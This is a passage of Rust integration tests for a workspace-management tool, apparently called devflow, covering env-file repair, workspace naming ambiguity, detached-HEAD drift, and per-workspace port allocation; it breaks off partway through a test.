fn the_list_says_a_derived_file_is_missing_until_the_workspace_is_entered_again() {
    let t = plain();
    let w = create(&t.project, "noted", SetupOptions::default())
        .unwrap()
        .workspace;
    let item = |t: &Repo| {
        setup::list(&t.project)
            .unwrap()
            .into_iter()
            .find(|i| i.workspace.path == w.path)
            .unwrap()
    };
    assert_eq!(item(&t).env_file, None);
    assert!(item(&t).remedies(&t.project).is_empty());

    std::fs::remove_file(env_file::path(&w.path)).unwrap();
    let listed = item(&t);
    assert_eq!(listed.env_file, Some(EnvFileProblem::Missing));
    assert_eq!(
        listed.status,
        Some(Status::Ready),
        "the status is the receipt's"
    );
    assert!(
        !EnvFileProblem::Missing.describe().contains("devflow "),
        "a message names the file, never a command"
    );
    assert_eq!(
        listed.remedies(&t.project),
        [devflow_core::remedy::Remedy::Setup {
            workspace: w.path.clone()
        }]
    );
    assert_eq!(
        serde_json::to_value(&listed).unwrap()["env_file"],
        serde_json::json!("missing")
    );

    std::fs::write(env_file::path(&w.path), [0xff, 0xfe]).unwrap();
    assert_eq!(item(&t).env_file, Some(EnvFileProblem::Unreadable));

    setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(item(&t).env_file, None);
    // A workspace that is not set up has nothing derived to miss.
    let raw = worktree::create(&t.project, "raw", None).unwrap();
    let listed = setup::list(&t.project).unwrap();
    assert_eq!(
        listed
            .iter()
            .find(|i| i.workspace.path == raw.path)
            .unwrap()
            .env_file,
        None
    );
}

#[test]
fn entering_a_workspace_with_autostart_hands_its_process_lock_to_the_start() {
    let t = repo(&Hooks::default(), "[pitchfork]\nautostart = true\n");
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"bun run dev\"\n",
    )
    .unwrap();
    commit_all(&git2::Repository::open(&t.root).unwrap(), "add a daemon");
    let project = Project::open(&t.root).unwrap();
    trust::approve(&project).unwrap();
    let w = create(&project, "daemons", SetupOptions::default())
        .unwrap()
        .workspace;
    let out = setup::activate(
        &project,
        &w,
        SetupOptions {
            pitchfork: Some(quiet_pitchfork()),
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    let started = out.autostart.expect("autostart was asked for");
    // Whatever the start came to (this fake has no mise to deliver the
    // variables), it was not stopped by the entry's own locks.
    assert!(
        !started
            .skipped
            .as_deref()
            .unwrap_or_default()
            .contains("another devflow operation"),
        "{started:?}"
    );
    assert!(!Receipt::is_locked(&w.git_dir));
    assert!(released_process_lock(&w.git_dir));
}

#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn managed_postgres_a_rebuilt_env_file_follows_the_endpoint_that_works_now() {
    let t = repo(&Hooks::default(), MANAGED);
    let _cleanup = managed_cleanup(&t.project);
    let w = create(
        &t.project,
        "w",
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(w.status, Status::Ready, "{:?}", w.receipt.phases);
    let good = binding(&w.receipt);
    let port = devflow_core::db::Server::for_project(&t.project)
        .unwrap()
        .unwrap()
        .app_endpoint()
        .unwrap()
        .1;

    // The server came back on another port since the receipt was written, and
    // the derived file is gone: the file is written with the port that works
    // now, not the recorded one, and nothing else about the binding changes.
    let mut stale = receipt_of(&w.workspace);
    let stale_url = good.url.replace(&format!(":{port}/"), ":9/");
    stale.services.get_mut("db").unwrap().url = stale_url.clone();
    stale.save(&w.workspace.git_dir).unwrap();
    std::fs::remove_file(env_file::path(&w.workspace.path)).unwrap();

    let out = setup::activate(
        &t.project,
        &w.workspace,
        SetupOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.repaired, [Repair::EnvFile]);
    assert_eq!(env_map(&w.workspace)["DATABASE_URL"], good.url);
    assert_eq!(receipt_of(&w.workspace).services["db"].url, good.url);
    assert_eq!(binding(&out.receipt).branch_id, good.branch_id);
    assert_ne!(stale_url, good.url);
}

#[test]
fn a_file_an_earlier_devflow_wrote_without_the_manifest_is_rebuilt_before_the_switch_hooks() {
    let t = repo(
        &Hooks {
            setup: &["echo ran >> ../../setup-count"],
            switch: &["touch .devflow/switched"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "legacy", SetupOptions::default())
        .unwrap()
        .workspace;
    assert!(!env_file::lacks_manifest(&w.path));
    let before = env_map(&w);
    let exported_before = receipt_of(&w).exported.clone();

    // A file as an earlier devflow wrote it: the variables, no manifest.
    env_file::write(&w.path, &before.clone().into_iter().collect::<Vec<_>>()).unwrap();
    assert!(env_file::lacks_manifest(&w.path));
    // The list says so, and the status is still the receipt's.
    let listed = setup::list(&t.project)
        .unwrap()
        .into_iter()
        .find(|i| i.workspace.path == w.path)
        .unwrap();
    assert_eq!(listed.env_file, Some(EnvFileProblem::NoManifest));
    assert_eq!(listed.status, Some(Status::Ready));
    assert!(
        !EnvFileProblem::NoManifest.describe().contains("`devflow"),
        "a message names the file, never a command"
    );
    // `--if-new` does not skip it either.
    assert!(
        setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress
        )
        .unwrap()
        .is_some_and(|out| out.repaired == [Repair::EnvFile])
    );
    assert!(!env_file::lacks_manifest(&w.path));

    // Entering it: rebuilt first, so the switch hooks (which refuse a file
    // without the manifest) run in the same entry. No setup hook runs again.
    env_file::write(&w.path, &before.clone().into_iter().collect::<Vec<_>>()).unwrap();
    let runs = setup_runs(&t);
    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert_eq!(out.repaired, [Repair::EnvFile]);
    assert!(out.switch_hooks.is_some_and(|report| report.ok));
    assert!(w.path.join(".devflow/switched").is_file());
    assert_eq!(setup_runs(&t), runs, "no setup hook ran again");
    assert!(!env_file::lacks_manifest(&w.path));
    assert_eq!(env_map(&w), before, "the same variables");

    // Written through the env phase's writer: the manifest lists what the
    // configuration declares, and the receipt keeps the names it exported.
    let contents = env_file::read_contents(&w.path).unwrap();
    let declared = contents.declared.expect("a manifest");
    assert!(declared.contains("DEVFLOW_WORKSPACE") && declared.contains("COMPOSE_PROJECT_NAME"));
    let exported = receipt_of(&w).exported;
    assert!(exported.is_superset(&exported_before));
    assert!(exported.contains("DEVFLOW_WORKSPACE"), "{exported:?}");
}

#[test]
fn resuming_a_creation_checks_the_base_against_the_existing_branch() {
    let t = plain();
    let first = create(&t.project, "x", SetupOptions::default()).unwrap();
    let git = git2::Repository::open(&t.root).unwrap();
    let at_creation = git
        .find_branch("x", git2::BranchType::Local)
        .unwrap()
        .get()
        .peel_to_commit()
        .unwrap();
    // Setup of `x` did not finish.
    let mut unfinished = receipt_of(&first.workspace);
    unfinished.set_phase(Phase::Hooks, PhaseState::Pending, None);
    unfinished.save(&first.workspace.git_dir).unwrap();

    // Another commit B on the default branch.
    std::fs::write(t.root.join("later.txt"), "later").unwrap();
    let mut index = git.index().unwrap();
    index.add_path(std::path::Path::new("later.txt")).unwrap();
    index.write().unwrap();
    let tree = git.find_tree(index.write_tree().unwrap()).unwrap();
    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
    let parent = git.head().unwrap().peel_to_commit().unwrap();
    let later = git
        .commit(Some("HEAD"), &sig, &sig, "later", &tree, &[&parent])
        .unwrap();

    let request = |base: &str| CreateRequest {
        name: "x".into(),
        from: None,
        base: Some(base.into()),
        options: SetupOptions::default(),
    };
    let error =
        setup::create(&t.project, request(&later.to_string()), &mut NoProgress).unwrap_err();
    assert!(
        format!("{error:#}").contains("already exists at"),
        "{error:#}"
    );
    assert_eq!(
        receipt_of(&first.workspace).phase(Phase::Hooks).state,
        PhaseState::Pending,
        "nothing was resumed"
    );
    let error = setup::create(&t.project, request("no-such-ref"), &mut NoProgress).unwrap_err();
    assert!(format!("{error:#}").contains("no-such-ref"), "{error:#}");
    assert_eq!(
        receipt_of(&first.workspace).phase(Phase::Hooks).state,
        PhaseState::Pending
    );

    // The commit the branch is at resumes it.
    let resumed = setup::create(
        &t.project,
        request(&at_creation.id().to_string()),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(resumed.receipt.instance_id, first.receipt.instance_id);
    assert_eq!(resumed.status, Status::Ready);
}

/// Workspace `feature/a` moved to branch `other`, and workspace `feature/b`
/// took its old branch: `feature/a` now names both checkouts.
fn two_checkouts_named_feature_a(t: &Repo) -> (Workspace, Workspace) {
    let a = create(&t.project, "feature/a", SetupOptions::default())
        .unwrap()
        .workspace;
    let b = create(&t.project, "feature/b", SetupOptions::default())
        .unwrap()
        .workspace;
    switch_checkout_to(&a, "other");
    git2::Repository::open(&b.path)
        .unwrap()
        .set_head("refs/heads/feature/a")
        .unwrap();
    assert!(worktree::find(&t.project, "feature/a").is_err());
    (a, b)
}

#[test]
fn a_workspace_made_from_a_path_keeps_that_source_while_its_name_is_ambiguous() {
    let t = plain();
    let (a, b) = two_checkouts_named_feature_a(&t);
    // A has a payload of its own, B another: the new workspace must get A's.
    std::fs::write(a.path.join(".env"), "FROM=a\n").unwrap();
    std::fs::write(b.path.join(".env"), "FROM=b\n").unwrap();
    let a_id = receipt_of(&a).instance_id;

    let out = setup::create_and_activate(
        &t.project,
        CreateRequest {
            name: "child".into(),
            from: Some(a.path.display().to_string()),
            base: None,
            options: SetupOptions::default(),
        },
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".env")).unwrap(),
        "FROM=a\n",
        "the payload came from the checkout that was named by its path"
    );
    // What is kept is the checkout and its incarnation, not the ambiguous name.
    assert_eq!(out.receipt.code_source_path.as_ref(), Some(&a.path));
    assert_eq!(out.receipt.code_source_instance, Some(a_id));
    assert_eq!(
        env_map(&out.workspace)["DEVFLOW_SOURCE_PATH"],
        a.path.display().to_string()
    );

    // Later runs find the same source without resolving the name again.
    std::fs::remove_file(env_file::path(&out.workspace.path)).unwrap();
    let again = setup::activate(
        &t.project,
        &out.workspace,
        SetupOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(again.repaired, [Repair::EnvFile]);
    assert_eq!(
        env_map(&out.workspace)["DEVFLOW_SOURCE_PATH"],
        a.path.display().to_string()
    );

    // A checkout recreated at the source's place is another incarnation: the
    // recorded source is gone, and the default workspace is the fallback.
    let mut moved = receipt_of(&a);
    moved.instance_id = uuid::Uuid::new_v4();
    moved.save(&a.git_dir).unwrap();
    let again = setup::activate(
        &t.project,
        &out.workspace,
        SetupOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(again.status, Status::Ready);
    std::fs::remove_file(env_file::path(&out.workspace.path)).unwrap();
    setup::activate(
        &t.project,
        &out.workspace,
        SetupOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(
        env_map(&out.workspace)["DEVFLOW_SOURCE_PATH"],
        t.root.display().to_string(),
        "another incarnation is not the source"
    );
}

#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn managed_postgres_a_workspace_made_from_a_path_takes_that_workspaces_data() {
    let t = repo(&Hooks::default(), MANAGED);
    let _cleanup = managed_cleanup(&t.project);
    let (a, b) = two_checkouts_named_feature_a(&t);
    let connect = |url: &str| postgres::Client::connect(url, postgres::NoTls);
    for (ws, marker) in [(&a, "a"), (&b, "b")] {
        let url = binding(&receipt_of(ws)).url;
        connect(&url)
            .unwrap()
            .batch_execute(&format!(
                "CREATE TABLE who(x text); INSERT INTO who VALUES ('{marker}')"
            ))
            .unwrap();
    }
    // No `--data-from`: the data follows the code source, which was chosen by
    // its path; the name is not looked up again.
    let out = create_from(&t, "child", &a.path);
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let who: String = connect(&binding(&out.receipt).url)
        .unwrap()
        .query_one("SELECT x FROM who", &[])
        .unwrap()
        .get(0);
    assert_eq!(who, "a");
    assert_eq!(binding(&out.receipt).source, "workspace:feature/a");
    // An explicit `--data-from` by an ambiguous name is refused, and by path
    // it works and is labelled with the workspace's name.
    let error = create(
        &t.project,
        "refused",
        SetupOptions {
            data_from: Some(DataSource::Workspace {
                name: "feature/a".into(),
            }),
            ..Default::default()
        },
    );
    assert!(error.is_err());
    let out = create(
        &t.project,
        "by-path",
        SetupOptions {
            data_from: Some(DataSource::Workspace {
                name: b.path.display().to_string(),
            }),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(binding(&out.receipt).source, "workspace:feature/b");
}

fn create_from(t: &Repo, name: &str, from: &Path) -> SetupOutcome {
    setup::create(
        &t.project,
        CreateRequest {
            name: name.into(),
            from: Some(from.display().to_string()),
            base: None,
            options: SetupOptions::default(),
        },
        &mut NoProgress,
    )
    .unwrap()
}

#[test]
fn a_deleted_checkout_is_found_and_removed_by_the_path_it_is_registered_under() {
    let t = plain();
    let (a, b) = two_checkouts_named_feature_a(&t);
    // The checkout `feature/a` also names, deleted behind devflow's back.
    std::fs::remove_dir_all(&b.path).unwrap();
    assert!(!b.path.exists());

    // A path needs no directory to name a registered checkout, so the
    // ambiguity remedy can pick it, and so can a removal.
    let by_path = worktree::find(&t.project, b.path.to_str().unwrap())
        .unwrap()
        .expect("the registration is found by its path");
    assert!(by_path.missing);
    assert_eq!(by_path.path, b.path);
    assert_eq!(
        by_path.name, "feature/b",
        "under the name it was created with"
    );
    let named = worktree::find(&t.project, "feature/a").unwrap_err();
    assert!(
        format!("{named:#}").contains(&b.path.display().to_string()),
        "the missing candidate is listed too: {named:#}"
    );

    setup::remove(
        &t.project,
        b.path.to_str().unwrap(),
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert!(
        worktree::find(&t.project, b.path.to_str().unwrap())
            .unwrap()
            .is_none()
    );
    assert!(a.path.exists(), "the other checkout was not touched");
    // With the deleted one gone, the name means the one that is left.
    assert_eq!(
        worktree::find(&t.project, "feature/a")
            .unwrap()
            .unwrap()
            .path,
        a.path
    );
}

#[test]
fn detaching_the_head_of_a_workspace_named_like_its_directory_is_drift() {
    let t = plain();
    // `scratch` has no slash: the workspace and its directory share a name.
    let w = create(&t.project, "scratch", SetupOptions::default())
        .unwrap()
        .workspace;
    assert_eq!(
        w.path.file_name().and_then(|n| n.to_str()),
        Some("scratch"),
        "the directory is named like the workspace"
    );
    assert!(!receipt_of(&w).adopted_detached);
    let repo = git2::Repository::open(&w.path).unwrap();
    let head = repo.head().unwrap().peel_to_commit().unwrap().id();
    repo.set_head_detached(head).unwrap();

    let listed = setup::list(&t.project)
        .unwrap()
        .into_iter()
        .find(|i| i.workspace.path == w.path)
        .unwrap();
    let drift = listed.drift.expect("a detached HEAD is drift");
    assert_eq!((drift.workspace.as_str(), drift.branch), ("scratch", None));
    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert!(
        out.drift
            .as_ref()
            .is_some_and(|d| d.describe().contains("detached HEAD")),
        "{:?}",
        out.drift
    );
    assert_eq!(out.workspace.name, "scratch");
}

#[test]
fn a_worktree_adopted_while_detached_records_it_and_shows_no_drift_until_it_moves() {
    let t = plain();
    let raw = worktree::create(&t.project, "raw", None).unwrap();
    let repo = git2::Repository::open(&raw.path).unwrap();
    let head = repo.head().unwrap().peel_to_commit().unwrap().id();
    repo.set_head_detached(head).unwrap();

    let out = setup::setup(
        &t.project,
        &worktree::list(&t.project)
            .unwrap()
            .into_iter()
            .find(|w| w.path == raw.path)
            .unwrap(),
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert!(out.receipt.adopted_detached);
    assert!(out.drift.is_none(), "detached is what it was adopted with");
    assert!(
        setup::list(&t.project)
            .unwrap()
            .iter()
            .all(|i| i.drift.is_none())
    );

    // On a branch now: that is a move.
    repo.branch("topic", &repo.find_commit(head).unwrap(), false)
        .unwrap();
    repo.set_head("refs/heads/topic").unwrap();
    let listed = setup::list(&t.project)
        .unwrap()
        .into_iter()
        .find(|i| i.workspace.path == raw.path)
        .unwrap();
    assert_eq!(
        listed.drift.map(|d| d.branch),
        Some(Some("topic".to_string()))
    );
}

// --- the app port ---------------------------------------------------------

fn setup_counter_repo() -> Repo {
    repo(
        &Hooks {
            setup: &["echo ran >> .devflow/setup-runs"],
            ..Default::default()
        },
        "[env]\nPORT = \"${DEVFLOW_PORT}\"\n",
    )
}

fn setup_runs_of(w: &Workspace) -> usize {
    std::fs::read_to_string(w.path.join(".devflow/setup-runs"))
        .map(|text| text.lines().count())
        .unwrap_or(0)
}

#[test]
fn a_workspace_gets_one_port_of_its_own_and_recipes_may_use_it() {
    let t = setup_counter_repo();
    trust::approve(&t.project).unwrap();
    let a = create(&t.project, "a", SetupOptions::default()).unwrap();
    let b = create(&t.project, "b", SetupOptions::default()).unwrap();
    let port = a.receipt.app_port.expect("a port");
    assert!((40000..=49999).contains(&port));
    assert_eq!(
        a.receipt.app_port_source,
        Some(devflow_core::ports::PortSource::Allocated)
    );
    assert_ne!(
        a.receipt.app_port, b.receipt.app_port,
        "one port per workspace"
    );
    assert_eq!(a.receipt.pending_app_port, None);
    let env = env_map(&a.workspace);
    assert_eq!(env["DEVFLOW_PORT"], port.to_string());
    assert_eq!(env["PORT"], port.to_string(), "a recipe references it");
    // It is an owned name: the manifest lists it.
    let declared = env_file::read_contents(&a.workspace.path)
        .unwrap()
        .declared
        .unwrap();
    assert!(declared.contains("DEVFLOW_PORT"), "{declared:?}");
    // The machine-wide reservation lists both.
    let reserved = devflow_core::ports::reserved();
    assert!(
        reserved
            .iter()
            .any(|(p, _, i)| *p == port && *i == a.receipt.instance_id)
    );

    // Kept: entering again, with something listening on it, changes nothing.
    let held = std::net::TcpListener::bind(("127.0.0.1", port));
    let again = setup::activate(
        &t.project,
        &a.workspace,
        SetupOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(again.receipt.app_port, Some(port));
    drop(held);
}

#[test]
fn a_recipe_cannot_set_the_port() {
    init();
    let dir = tempfile::tempdir().unwrap();
    let text = config_text(&Hooks::default(), "[env]\nDEVFLOW_PORT = \"3000\"\n");
    std::fs::write(dir.path().join("devflow.toml"), text).unwrap();
    let error = Config::load(dir.path()).unwrap_err().to_string();
    assert!(
        error.contains("DEVFLOW_PORT") && error.contains("reserved"),
        "{error}"
    );
}

#[test]
fn a_ready_workspace_without_a_port_is_given_one_without_running_hooks_again() {
    let t = setup_counter_repo();
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "old", SetupOptions::default())
        .unwrap()
        .workspace;
    assert_eq!(setup_runs_of(&w), 1);
    // A workspace set up before ports existed.
    let mut receipt = receipt_of(&w);
    receipt.app_port = None;
    receipt.app_port_source = None;
    receipt.save(&w.git_dir).unwrap();
    let before = env_map(&w);
    // The configuration generation did not change: it is ready, not reopened.
    let listed = setup::list(&t.project).unwrap();
    let item = listed.iter().find(|i| i.workspace.path == w.path).unwrap();
    assert_eq!(item.status, Some(Status::Ready));

    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert_eq!(out.repaired, [Repair::AppPort]);
    let port = out.receipt.app_port.expect("a port");
    let after = env_map(&w);
    assert_eq!(after["DEVFLOW_PORT"], port.to_string());
    assert_eq!(after["PORT"], port.to_string());
    for (key, value) in &before {
        if key != "PORT" {
            assert_eq!(after.get(key), Some(value), "{key}");
        }
    }
    assert_eq!(setup_runs_of(&w), 1, "no setup hook ran again");

    // Entering again repairs nothing.
    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert!(out.repaired.is_empty());
    assert_eq!(out.receipt.app_port, Some(port));
}

#[test]
fn a_port_is_not_added_where_the_recipes_are_not_approved() {
    let t = setup_counter_repo();
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "old", SetupOptions::default())
        .unwrap()
        .workspace;
    let mut receipt = receipt_of(&w);
    receipt.app_port = None;
    receipt.save(&w.git_dir).unwrap();
    trust::revoke_all(&t.project).unwrap();
    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(
        out.status,
        Status::Ready,
        "a port never makes a ready workspace need attention"
    );
    assert!(out.repaired.is_empty());
    assert_eq!(out.receipt.app_port, None);
}

#[test]
fn the_port_is_chosen_by_ledger_and_bind_check_and_resumes_where_it_stopped() {
    let t = plain();
    let a = create(&t.project, "a", SetupOptions::default())
        .unwrap()
        .workspace;
    let b = create(&t.project, "b", SetupOptions::default())
        .unwrap()
        .workspace;
    let c = create(&t.project, "c", SetupOptions::default())
        .unwrap()
        .workspace;
    let mut project = t.project.clone();
    // A range with room for two.
    project.config.worktree.port_range = Some([47000, 47001]);
    let clear = |w: &Workspace| {
        let mut receipt = receipt_of(w);
        receipt.app_port = None;
        receipt.save(&w.git_dir).unwrap();
        devflow_core::ports::release(t.project.id(), receipt.instance_id, &w.path);
        receipt
    };
    let mut ra = clear(&a);
    let mut rb = clear(&b);
    let mut rc = clear(&c);
    // Something listens on the first candidate of `a`.
    let first = devflow_core::ports::candidates(&project.config, project.id(), ra.instance_id)[0];
    let ensured = devflow_core::ports::ensure_with(&project, &a, &mut ra, &|port| port != first);
    assert_eq!(
        ensured.port,
        Some(if first == 47000 { 47001 } else { 47000 })
    );
    assert!(ensured.allocated && ensured.warnings.is_empty());
    // The other takes the remaining one: a ledger entry keeps them apart
    // although nothing listens on either.
    let ensured = devflow_core::ports::ensure_with(&project, &b, &mut rb, &|_| true);
    assert!(ensured.allocated);
    assert_ne!(ensured.port, ra.app_port);
    // Nothing is left for the third: no port, and it says why.
    let ensured = devflow_core::ports::ensure_with(&project, &c, &mut rc, &|_| true);
    assert_eq!(ensured.port, None);
    assert!(
        ensured
            .warnings
            .iter()
            .any(|w| w.contains("47000") && w.contains("47001")),
        "{:?}",
        ensured.warnings
    );
    assert_eq!(receipt_of(&c).pending_app_port, None);

    // Resume: a candidate journaled before the reservation is the one taken.
    devflow_core::ports::release(t.project.id(), ra.instance_id, &a.path);
    let mut ra = clear(&a);
    let candidates = devflow_core::ports::candidates(&project.config, project.id(), ra.instance_id);
    ra.pending_app_port = Some(candidates[1]);
    ra.save(&a.git_dir).unwrap();
    let ensured = devflow_core::ports::ensure_with(&project, &a, &mut ra, &|port| {
        port == candidates[1] || port == candidates[0]
    });
    assert_eq!(
        ensured.port,
        Some(candidates[1]),
        "resumes at the journaled candidate"
    );
    assert_eq!(receipt_of(&a).app_port, Some(candidates[1]));
    assert_eq!(receipt_of(&a).pending_app_port, None);
    // Release on removal.
    let instance = ra.instance_id;
    devflow_core::ports::release(t.project.id(), instance, &a.path);
    assert!(
        devflow_core::ports::reserved()
            .iter()
            .all(|(_, _, i)| *i != instance)
    );
}

#[test]
fn removal_gives_the_port_back() {
    let t = plain();
    let w = create(&t.project, "gone", SetupOptions::default()).unwrap();
    let instance = w.receipt.instance_id;
    assert!(
        devflow_core::ports::reserved()
            .iter()
            .any(|(_, _, i)| *i == instance)
    );
    setup::remove(
        &t.project,
        "gone",
        RemoveOptions {
            pitchfork: Some(quiet_pitchfork()),
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(
        devflow_core::ports::reserved()
            .iter()
            .all(|(_, _, i)| *i != instance)
    );
}

#[test]
fn conductors_port_is_used_where_conductor_made_the_workspace() {
    if !in_child(
        "conductors_port_is_used_where_conductor_made_the_workspace",
        &[("CONDUCTOR_PORT", "47311")],
    ) {
        return;
    }
    let t = plain();
    // Conductor says which workspace it runs in: that is the evidence.
    // SAFETY: this runs alone in a child process (see `in_child`).
    unsafe {
        std::env::set_var(
            "CONDUCTOR_WORKSPACE_PATH",
            worktree::path_for(&t.project, "conducted"),
        );
    }
    let w = create(&t.project, "conducted", SetupOptions::default()).unwrap();
    assert_eq!(w.receipt.app_port, Some(47311));
    assert_eq!(
        w.receipt.app_port_source,
        Some(devflow_core::ports::PortSource::Conductor)
    );
    assert_eq!(env_map(&w.workspace)["DEVFLOW_PORT"], "47311");
}

#[test]
fn a_shell_in_another_conductor_workspace_does_not_lend_its_port() {
    if !in_child(
        "a_shell_in_another_conductor_workspace_does_not_lend_its_port",
        &[
            ("CONDUCTOR_PORT", "47321"),
            ("CONDUCTOR_WORKSPACE_PATH", "/conductor/elsewhere"),
        ],
    ) {
        return;
    }
    let t = plain();
    let w = create(&t.project, "other", SetupOptions::default()).unwrap();
    let port = w.receipt.app_port.expect("a port");
    assert_ne!(port, 47321);
    assert_eq!(
        w.receipt.app_port_source,
        Some(devflow_core::ports::PortSource::Allocated)
    );
}

#[test]
fn a_no_db_workspace_set_up_before_ports_is_not_reopened_and_runs_no_hook_again() {
    let t = repo(
        &Hooks {
            setup: &["echo ran >> .devflow/setup-runs"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let w = create(
        &t.project,
        "old",
        SetupOptions {
            no_db: true,
            ..Default::default()
        },
    )
    .unwrap()
    .workspace;
    assert_eq!(setup_runs_of(&w), 1);
    // The receipt as the release before ports wrote it: the generation that
    // hashed the names without `DEVFLOW_PORT`, and no port.
    let mut receipt = receipt_of(&w);
    assert!(receipt.services_skipped_on_request());
    receipt.app_port = None;
    receipt.app_port_source = None;
    receipt.env_generation =
        Some(devflow_core::receipt::previous_env_generation_without_services(&t.project.config));
    receipt.save(&w.git_dir).unwrap();
    let listed = setup::list(&t.project).unwrap();
    let item = listed.iter().find(|i| i.workspace.path == w.path).unwrap();
    assert_eq!(
        item.status,
        Some(Status::Ready),
        "not reopened by an upgrade"
    );

    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert_eq!(out.repaired, [Repair::AppPort]);
    assert_eq!(setup_runs_of(&w), 1, "no completed hook ran again");
    assert!(env_map(&w).contains_key("DEVFLOW_PORT"));
    // Stamped with the current generation: a later release's new name is
    // no drift either.
    let current = receipt_of(&w);
    assert_ne!(
        current.env_generation.as_deref(),
        Some(
            devflow_core::receipt::previous_env_generation_without_services(&t.project.config)
                .as_str()
        )
    );
    assert_eq!(current.status(), Status::Ready);
}

#[test]
fn an_inherited_conductor_port_alone_is_given_to_nobody() {
    if !in_child(
        "an_inherited_conductor_port_alone_is_given_to_nobody",
        &[("CONDUCTOR_PORT", "47331")],
    ) {
        return;
    }
    // An agent inside one Conductor workspace creating several: no
    // CONDUCTOR_WORKSPACE_PATH says the port is theirs, so each allocates.
    let t = plain();
    let a = create(&t.project, "a", SetupOptions::default()).unwrap();
    let b = create(&t.project, "b", SetupOptions::default()).unwrap();
    for w in [&a, &b] {
        assert_ne!(w.receipt.app_port, Some(47331));
        assert_eq!(
            w.receipt.app_port_source,
            Some(devflow_core::ports::PortSource::Allocated)
        );
    }
    assert_ne!(a.receipt.app_port, b.receipt.app_port);
}

#[test]
fn a_new_identity_does_not_keep_the_old_identitys_port() {
    let t = plain();
    let w = create(&t.project, "forked", SetupOptions::default()).unwrap();
    let (old_instance, old_port) = (w.receipt.instance_id, w.receipt.app_port.unwrap());
    let out = setup::setup(
        &t.project,
        &w.workspace,
        SetupOptions::default(),
        false,
        true,
        &mut NoProgress,
    )
    .unwrap()
    .expect("setup ran");
    assert_ne!(out.receipt.instance_id, old_instance);
    let new_port = out.receipt.app_port.expect("the new identity has a port");
    assert_eq!(out.receipt.pending_app_port, None);
    assert_eq!(
        env_map(&out.workspace)["DEVFLOW_PORT"],
        new_port.to_string()
    );
    let reserved = devflow_core::ports::reserved();
    assert!(
        reserved.iter().all(|(_, _, i)| *i != old_instance),
        "{reserved:?}"
    );
    assert!(
        reserved
            .iter()
            .any(|(p, _, i)| *p == new_port && *i == out.receipt.instance_id)
    );
    let _ = old_port;
}

#[test]
fn replacing_an_identity_gives_up_that_checkouts_reservation_only() {
    let t = plain();
    let a = create(&t.project, "orig", SetupOptions::default()).unwrap();
    let b = create(&t.project, "copy", SetupOptions::default()).unwrap();
    // `copy` is a copy of `orig`: the same identity and port, at another path.
    let mut copy = receipt_of(&b.workspace);
    copy.instance_id = a.receipt.instance_id;
    copy.app_port = a.receipt.app_port;
    copy.save(&b.workspace.git_dir).unwrap();
    let ensured = devflow_core::ports::ensure(&t.project, &b.workspace, &mut copy);
    assert_eq!(ensured.port, a.receipt.app_port);
    let holders = |instance| {
        devflow_core::ports::reserved()
            .iter()
            .filter(|(_, _, i)| *i == instance)
            .count()
    };
    assert_eq!(
        holders(a.receipt.instance_id),
        2,
        "two checkouts, one identity"
    );
    // The copy takes a new identity: the original keeps its reservation.
    devflow_core::ports::forget_replaced(t.project.id(), a.receipt.instance_id, &b.workspace.path);
    assert_eq!(holders(a.receipt.instance_id), 1);
}

#[test]
fn a_moved_checkout_keeps_its_port_reserved() {
    let t = plain();
    let a = create(&t.project, "moving", SetupOptions::default()).unwrap();
    let port = a.receipt.app_port.unwrap();
    let to = a.workspace.path.with_file_name("moved-elsewhere");
    let moved = std::process::Command::new("git")
        .current_dir(&t.root)
        .args(["worktree", "move"])
        .arg(&a.workspace.path)
        .arg(&to)
        .output();
    let moved = moved.expect("git is needed to move a worktree");
    assert!(
        moved.status.success(),
        "{}",
        String::from_utf8_lossy(&moved.stderr)
    );
    // A workspace whose range holds only that port finds it taken, though the
    // directory the reservation was made for is gone.
    let mut project = t.project.clone();
    project.config.worktree.port_range = Some([port.max(1024), port.max(1024)]);
    let other = create(&t.project, "other", SetupOptions::default()).unwrap();
    let mut receipt = receipt_of(&other.workspace);
    receipt.app_port = None;
    receipt.save(&other.workspace.git_dir).unwrap();
    devflow_core::ports::release(t.project.id(), receipt.instance_id, &other.workspace.path);
    let ensured =
